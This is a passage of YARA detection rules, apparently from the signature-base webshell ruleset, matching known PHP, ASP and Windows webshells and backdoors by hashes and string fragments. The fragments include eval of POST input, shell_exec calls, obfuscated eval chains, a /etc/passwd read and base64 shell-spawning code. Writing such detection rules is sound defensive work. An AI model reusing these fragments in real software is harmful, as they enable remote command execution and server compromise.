		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"

	strings:
		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_8
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "40c6f69f-9963-5e4f-af44-041d47738519"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6831-L6850"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "346df2686c4d43b3210b07a30845477e057602500e67baba69b50c41e8d501fa"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
		hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
		hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"

	strings:
		$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
		$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s3 = "/* I added this to ensure the script will run correctly..." fullword
		$s14 = "<!--    </form>   -->" fullword
		$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
		$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv_Klasvayv_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6851-L6869"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "42959ba1e3c0f7f198f953e98b9df87059999f5526df4338c109828d0a5a518a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"

	strings:
		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv
{
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6893-L6909"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b2f2b95415bc990adac38eada20cbc793f286d51f2054bc969e9c667f16717f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"

	strings:
		$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
		$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
		$s17 = "name=\"duzenx2\" value=\"Klas" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Crystalshell_V_1_Erne_Stres
{
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4e73e42e-b968-5b68-a00d-d2a8a1f3541c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6952-L6973"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a0484a5a71715d6a79c89e20919ab89aaa7e85a18ee502651f1f6b29153847a3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
		$s4 = "var_dump(curl_exec($ch));" fullword
		$s7 = "if(empty($_POST['Mohajer22'])){" fullword
		$s10 = "$m=$_POST['curl'];" fullword
		$s13 = "$u1p=$_POST['copy'];" fullword
		$s14 = "if(empty(\\$_POST['cmd'])){" fullword
		$s15 = "$string = explode(\"|\",$string);" fullword
		$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword

	condition:
		5 of them
}

rule SIGNATURE_BASE_Webshell_GFS
{
	meta:
		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bde6cfd8-466f-528a-b1e3-f874aa778010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7018-L7034"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "72a3f117cb11e1461b760c47a3de74283640b6e1daa87b24e45210213bb76609"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"

	strings:
		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_10
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f52013d6-72ce-544c-a7ef-ae2a2ea87108"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7056-L7076"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0bf731edef55cde5d2ad16510fb9f1a240c1a06b535af7e13300fdbea470df74"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"

	strings:
		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
		$s12 = "else if( $mode & 0xA000 ) " fullword
		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
		$s20 = "font-size: 8pt;" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_11
{
	meta:
		description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
		author = "Florian Roth (Nextron Systems)"
		id = "590c5320-ef85-5522-94fd-4619749f7eb1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7077-L7099"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5a559a26314ce603d6454efb71f1243bf89daed920ca2a495a51b94a4cca0045"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
		hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
		hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
		hash3 = "80aba3348434c66ac471daab949871ab16c50042"

	strings:
		$s5 = "$filename = $backupstring.\"$filename\";" fullword
		$s6 = "while ($file = readdir($folder)) {" fullword
		$s7 = "if($file != \".\" && $file != \"..\")" fullword
		$s9 = "$backupstring = \"copy_of_\";" fullword
		$s10 = "if( file_exists($file_name))" fullword
		$s13 = "global $file_name, $filename;" fullword
		$s16 = "copy($file,\"$filename\");" fullword
		$s18 = "<td width=\"49%\" height=\"142\">" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell__Findsock_Php_Findsock_Shell_Php_Reverse_Shell
{
	meta:
		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "6567c8f1-bd7f-5844-b937-3db2d8eb7408"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7100-L7114"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2459f7114482e17f087bda4b638c29e237f2f3cb5a9e41e326ed65fc1834b6be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"

	strings:
		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_6
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "e61ec617-565a-5b24-82f4-3677ef379a06"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7115-L7136"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7b3f2ca3cb9516ddda1b9cac2ca5eb5d9e62e1839dad041f69a3dc7a2a186897"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
		hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
		$s5 = "echo shell_exec($com);" fullword
		$s7 = "if($sertype == \"winda\"){" fullword
		$s8 = "function execute($com)" fullword
		$s12 = "echo decode(execute($cmd));" fullword
		$s15 = "echo system($com);" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Unpack_Injectt
{
	meta:
		description = "Webshells Auto-generated - file Injectt.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "80dc3086-41a6-5e30-bbf4-463500fe5e33"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7138-L7151"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a5d2158a566c87edc999771e12d42c5"
		logic_hash = "d8e9ed4f2604617bd6410f36ab827affa3cc6729ba996d0d9cd9c8eb0fd96533"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "%s -Run                              -->To Install And Run The Service"
		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Fso
{
	meta:
		description = "Webshells Auto-generated - file fso.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "094eeff9-0da0-5a44-a45c-f8ee57861e7a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7152-L7164"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b37f3cde1a08890bd822a182c3a881f6"
		logic_hash = "9d071c1e2e0725091a2abe24759e6e71d78e29caa76b4fff77c44e3bb381b1a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageFSO Below -->"
		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Ssh
{
	meta:
		description = "Webshells Auto-generated - file ssh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b971065-df16-5092-beff-c55608447f19"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7165-L7176"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1aa5307790d72941589079989b4f900e"
		logic_hash = "40c5a5d1d714947454f4aa9f7ed09d777cb60c23933201ac8eaf0d49452af8c6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(gzinflate(str_rot13(base64_decode('"

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Bdoor
{
	meta:
		description = "Webshells Auto-generated - file BDoor.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "0938efe7-2b6d-5749-af9a-967cca85defb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7177-L7189"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e4e8e31dd44beb9320922c5f49739955"
		logic_hash = "ed8caeb96a6fc48fe23d5db078bbb8ba5aec3c5d4ee382cbc6bc4e01630f1460"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\"
		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bin_Client
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8564d787-5edc-59b0-b1ef-2f33c8a24f82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7190-L7204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
		logic_hash = "28ce9aa136b5d41bb580e6b5b8580d3ccbb7eeec31007e68241d23c5a0f40d40"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Recieved respond from server!!"
		$s4 = "packet door client"
		$s5 = "input source port(whatever you want):"
		$s7 = "Packet sent,waiting for reply..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxshell
{
	meta:
		description = "Webshells Auto-generated - file ZXshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "621ac87e-b1f8-58d7-9328-54af5ca9b605"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7205-L7217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "246ce44502d2f6002d720d350e26c288"
		logic_hash = "72eaf90551144eccb7329e0a0e05bcc955ea2bfdb37aa87e9cae7b5f5a26bea0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WPreviewPagesn"
		$s1 = "DA!OLUTELY N"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rkntload
{
	meta:
		description = "Webshells Auto-generated - file RkNTLoad.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fd4b1343-5fa9-5ad8-bee1-6b06b93ddfbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7218-L7236"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "262317c95ced56224f136ba532b8b34f"
		logic_hash = "ab767a7016318633055a85195ca2bab08a8c68222d46018aaf8772ab27a373c4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s2 = "5pur+virtu!"
		$s3 = "ugh spac#n"
		$s4 = "xcEx3WriL4"
		$s5 = "runtime error"
		$s6 = "loseHWait.Sr."
		$s7 = "essageBoxAw"
		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"

	condition:
		all of them
}

rule SIGNATURE_BASE_Binder2_Binder2
{
	meta:
		description = "Webshells Auto-generated - file binder2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "29269dc0-f2e4-56ec-ad64-0dff00e339b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7237-L7253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d594e90ad23ae0bc0b65b59189c12f11"
		logic_hash = "fbe56b7d37fc7863fcf55761c0b5b671d661a713ac95f90d65b79eee9a447a9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "IsCharAlphaNumericA"
		$s2 = "WideCharToM"
		$s4 = "g 5pur+virtu!"
		$s5 = "\\syslog.en"
		$s6 = "heap7'7oqk?not="
		$s8 = "- Kablto in"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Orice2
{
	meta:
		description = "Webshells Auto-generated - file orice2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "968cef9e-0163-5f4a-91e3-07510f9f4fcd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7254-L7266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aa63ffb27bde8d03d00dda04421237ae"
		logic_hash = "075f3377a9b90c6c1ba74682415b9c0832a839afe647fa6d3c85d4e987618405"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " $aa = $_GET['aa'];"
		$s1 = "echo $aa;"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Sincap
{
	meta:
		description = "Webshells Auto-generated - file sincap.php"
		author = "Florian Roth (Nextron Systems)"
		id = "fcee20a3-e71b-5f69-ac67-8660fd270703"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7267-L7279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
		logic_hash = "705030e93248f5ea6744f78bd7a1816aaa9772880059286b8d686e05b193d4a0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell
{
	meta:
		description = "Webshells Auto-generated - file PhpShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "887264d3-5704-5e38-b0a6-44d529258ea2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7280-L7291"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "539baa0d39a9cf3c64d65ee7a8738620"
		logic_hash = "95b3cedac370bf9b06092035a738722f3ec97e6cbafe3d4f742429a865576ad8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Config
{
	meta:
		description = "Webshells Auto-generated - file config.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "da1b8ce1-8b17-53f6-a86b-ad3fe918084e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7292-L7305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b41d0e64e64a685178a3155195921d61"
		logic_hash = "b2806c30db413bca518943352f233c9d2915356a41eceed5e352b88ee34fbbd3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "const adminPassword=\""
		$s2 = "const userPassword=\""
		$s3 = "const mVersion="

	condition:
		all of them
}

rule SIGNATURE_BASE_Sendmail
{
	meta:
		description = "Webshells Auto-generated - file sendmail.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd33c2bb-61bf-57b7-82b9-d864097f7a56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7306-L7318"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75b86f4a21d8adefaf34b3a94629bd17"
		logic_hash = "bcca9a9380d2695bc277afc9fa72c24cb26ac44c6fbcc87113b017cfe190bdab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "_NextPyC808"
		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9f1adcd6-b721-54ef-a20f-c3a353629a40"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7319-L7330"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "6bcfb1ee40403394bf996ecbe1bb17f9afa0c3ba9e1906881b94bbc785b4a510"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = " byMesaj "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkshell
{
	meta:
		description = "Webshells Auto-generated - file hkshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7436cd7c-7027-56dc-bb62-fac0f70c27d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7331-L7344"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "168cab58cee59dc4706b3be988312580"
		logic_hash = "bee4d4c957ede41c771d690d52ac2fd3655238cc1fc106d30fb2721084b38aa1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "PrSessKERNELU"
		$s2 = "Cur3ntV7sion"
		$s3 = "Explorer8"

	condition:
		all of them
}

rule SIGNATURE_BASE_Unpack_Tback
{
	meta:
